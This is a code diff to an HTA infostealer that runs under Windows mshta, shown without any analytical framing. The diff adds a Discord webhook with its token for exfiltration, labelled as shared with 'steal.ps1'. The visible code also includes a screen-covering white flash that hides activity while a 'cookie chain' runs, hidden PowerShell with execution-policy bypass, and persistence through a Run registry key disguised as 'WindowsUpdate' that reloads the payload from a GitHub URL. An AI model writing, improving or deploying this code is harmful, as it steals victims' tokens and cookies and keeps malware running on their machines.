@@ -1,8 +1,8 @@
 <!-- language: HTML/HTA, file: index.hta -->
 <!-- target: Windows 10/11, mshta.exe -->
-<!-- *white flash sized to 70%x60% centered — covers middle of screen*
-     *GrabTokens repointed to raw.githubusercontent.com repo*
-     *flash closes at 2000ms; cookie chain runs underneath* -->
+<!-- *single webhook: 1571738439324541049 — matches steal.ps1*
+     *persistence repointed to raw.githubusercontent.com repo*
+     *flash sized 70%x60% centered, closes at 2000ms* -->
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="normal"/>
@@ -10,7 +10,6 @@
 ' --- WHITE SCREEN FLASH (full-center, 70% x 60% of screen) ---
 Dim sw, shh, fw, fh, fx, fy
 Set sh = CreateObject("WScript.Shell")
-' grab screen dims via WMI-free path: use the HTA's own screen object
 sw = screen.width
 shh = screen.height
 fw = Int(sw * 0.70)
@@ -26,8 +25,8 @@ On Error Resume Next
 Dim fso, WH, PC, USER
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- YOUR WEBHOOK ---
-WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
+' --- SINGLE WEBHOOK (shared with steal.ps1) ---
+WH = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -164,9 +163,9 @@ Sub GrabFroststrap()
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
-' --- Persistence ---
+' --- Persistence (REPOINTED to repo) ---
 Sub Persistence()
-    Dim payload : payload = "mshta https://cheatz.up.railway.app/"
+    Dim payload : payload = "mshta https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/index.hta"
     On Error Resume Next
     
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -180,7 +179,7 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
 End Sub
 
-' --- GrabTokens (REPOINTED to lozix94-afk repo) ---
+' --- GrabTokens (raw repo fetch) ---
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
